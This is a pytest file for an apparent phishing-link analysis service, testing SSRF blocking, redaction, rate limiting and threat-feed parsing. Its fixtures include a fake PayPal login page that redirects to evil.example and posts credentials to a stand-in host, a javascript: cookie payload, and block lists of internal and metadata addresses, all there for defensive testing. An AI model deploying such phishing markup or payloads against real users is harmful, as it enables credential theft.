import json
import logging

import pytest
from pydantic import ValidationError

from bootstrap.settings import Settings
from infrastructure.cache.rate_limit import SlidingWindowLimiter
from infrastructure.external_services.network_policy import BlockedDestination, NetworkPolicy, is_public_ip
from infrastructure.observability.logging import JsonFormatter
from infrastructure.observability.metrics import Metrics
from modules.link_analysis.infrastructure.html_snapshot import build_snapshot, detect_client_redirect
from modules.link_analysis.infrastructure.reference_loader import load_reference
from modules.threat_intel.domain.indicators import normalize_url, parse_feed, reconcile, url_lookup_keys
from shared.utilities.redaction import redact_url
import ipaddress


# ---- SSRF policy: every kind of internal or special address must be refused --------------------------------------
@pytest.mark.parametrize("ip", ["127.0.0.1", "10.1.2.3", "172.16.0.9", "192.168.1.1", "169.254.169.254", "100.64.0.1", "0.0.0.0", "224.0.0.1",
                                "::1", "fe80::1", "fd00:ec2::254", "::ffff:127.0.0.1", "64:ff9b::7f00:1", "2002:7f00:1::1", "2001:0:4136:e378:8000:63bf:3fff:fdd2"])
def test_internal_addresses_are_blocked(ip):
    assert not is_public_ip(ipaddress.ip_address(ip))
    with pytest.raises(BlockedDestination):
        NetworkPolicy().check_ip(ip)


@pytest.mark.parametrize("ip", ["8.8.8.8", "93.184.216.34", "2001:4860:4860::8888", "1.1.1.1"])
def test_public_addresses_pass(ip):
    NetworkPolicy().check_ip(ip)


def test_port_allow_list():
    p = NetworkPolicy()
    p.check_port(443)
    for bad in (22, 25, 3306, 6379, 9200):
        with pytest.raises(BlockedDestination):
            p.check_port(bad)


# ---- rate limiter ---------------------------------------------------------------------------------------------------
def test_sliding_window_and_bounded_memory():
    now = [0.0]
    lim = SlidingWindowLimiter(3, 60, max_keys=5, clock=lambda: now[0])
    assert [lim.check("a")[0] for _ in range(4)] == [True, True, True, False]
    allowed, retry = lim.check("a")
    assert not allowed and 1 <= retry <= 61
    now[0] = 61
    assert lim.check("a")[0]
    for i in range(50):
        lim.check(f"k{i}")
    assert len(lim) <= 5                                    # an attacker rotating keys cannot grow memory


# ---- privacy: logs never carry paths, queries or credentials -------------------------------------------------------
def test_redaction():
    assert redact_url("https://user:pw@host.example/a/b?token=SECRET#frag") == "https://host.example/…"
    assert "SECRET" not in redact_url("http://h.example/?token=SECRET")
    assert redact_url("javascript:alert(document.cookie)") == "javascript:<redacted>"
    assert redact_url("\x00\x01") == "<unparsed>"


def test_json_logs_redact_secret_fields():
    rec = logging.LogRecord("x", logging.INFO, "f", 1, "event", (), None)
    rec.password = "hunter2"; rec.api_key = "k"; rec.status = 200
    out = json.loads(JsonFormatter("svc", "test").format(rec))
    assert out["password"] == "[redacted]" and out["api_key"] == "[redacted]" and out["status"] == 200


def test_metrics_render():
    m = Metrics(); m.inc("a_total", {"x": "1"}); m.observe("d_seconds", 1.5)
    text = m.render()
    assert 'a_total{x="1"} 1' in text and "d_seconds_count 1" in text


# ---- settings guard rails -----------------------------------------------------------------------------------------
def test_settings_refuse_unsafe_production():
    with pytest.raises(ValidationError):
        Settings(environment="production", allow_private_networks=True, _env_file=None)
    with pytest.raises(ValidationError):
        Settings(allowed_fetch_ports="80,abc", _env_file=None)
    with pytest.raises(ValidationError):
        Settings(port=70000, _env_file=None)
    assert Settings(_env_file=None).allow_private_networks is False   # safe by default
    s = Settings(gsb_api_key="very-secret", _env_file=None)
    assert "very-secret" not in repr(s) and "very-secret" not in str(s.model_dump())


# ---- reference data is validated, not trusted -----------------------------------------------------------------------
def test_reference_loader_rejects_bad_data(tmp_path):
    import shutil
    from pathlib import Path
    src = Path(__file__).resolve().parents[2] / "config" / "defaults" / "reference"
    shutil.copytree(src, tmp_path / "ref")
    brands = json.loads((tmp_path / "ref" / "brands.json").read_text())
    brands["brands"][0]["domains"] = ["not a domain"]
    (tmp_path / "ref" / "brands.json").write_text(json.dumps(brands))
    with pytest.raises(ValueError):
        load_reference(tmp_path / "ref")


# ---- HTML snapshot parsing ------------------------------------------------------------------------------------------
HTML = b"""<html lang="en"><head><title>PayPal - Log in</title><meta property="og:site_name" content="PayPal">
<style>.ghost{position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;opacity:0}</style>
<script>window.location = "https://evil.example/x";</script></head>
<body><form action="https://c.example/p" method="post"><input type="email" name="e"><input type="password" name="p"></form>
<input name="otp" autocomplete="one-time-code"><div class="ghost"><a href="/x">x</a></div><iframe src="https://o.example/f" width="0" height="0"></iframe></body></html>"""


def test_snapshot_extracts_facts_without_executing_anything():
    p = build_snapshot(HTML, "text/html; charset=utf-8")
    assert p.title == "PayPal - Log in" and p.og_site_name == "PayPal"
    assert [f.action for f in p.forms] == ["https://c.example/p", None]       # second = inputs outside any <form>
    assert any(f.type == "password" for f in p.forms[0].fields)
    assert p.iframes[0].width == "0" and any(e.classes == "ghost" for e in p.elements) and p.style_rules
    assert detect_client_redirect(p) == ("javascript", "https://evil.example/x")


def test_snapshot_survives_hostile_markup():
    deep = b"<div>" * 20000 + b"x"
    assert build_snapshot(deep, "text/html").byte_size == len(deep)
    assert build_snapshot(b"\x00\xff<<<>>>&&&", None).title == ""


# ---- threat feed parsing ---------------------------------------------------------------------------------------------
def test_feed_parsing_formats():
    urls = parse_feed("# c\nhttp://Evil.Example:80/a/Login.php?x=1#f\nnot a url\nhttps://b.example/\n", "urls", "url", "phishing")
    assert {i.value for i in urls.indicators} == {"http://evil.example/a/Login.php?x=1", "https://b.example/"} and urls.rejected_lines == 1
    cidr = parse_feed('{"cidr":"10.0.0.0/24","sblid":"SBL1"}\n{"type":"metadata","copyright":"x"}\nbad', "cidr_json_lines", "cidr", "abuse")
    assert [i.value for i in cidr.indicators] == ["10.0.0.0/24"] and cidr.rejected_lines == 1
    assert [i.value for i in parse_feed('{"asn":64500}\nAS64501 ; SBL9', "asn_json_lines", "asn", "abuse").indicators] == ["64500"]
    assert [i.value for i in parse_feed("AS64501 ; SBL9\n64502", "asn_text", "asn", "abuse").indicators] == ["64501", "64502"]


def test_url_matching_tolerates_victim_specific_query_strings():
    assert normalize_url("HTTPS://Evil.example:443/p?x=1#f") == "https://evil.example/p?x=1"
    keys = url_lookup_keys("https://evil.example/login.php?email=victim@x.com")
    assert "https://evil.example/login.php" in keys and "http://evil.example/login.php" in keys


def test_reconcile_rejects_suspicious_shrinkage():
    assert reconcile(new_count=500, previous_count=480, min_expected=50)[0]
    assert not reconcile(new_count=3, previous_count=None, min_expected=50)[0]
    assert not reconcile(new_count=40, previous_count=1000, min_expected=10)[0]
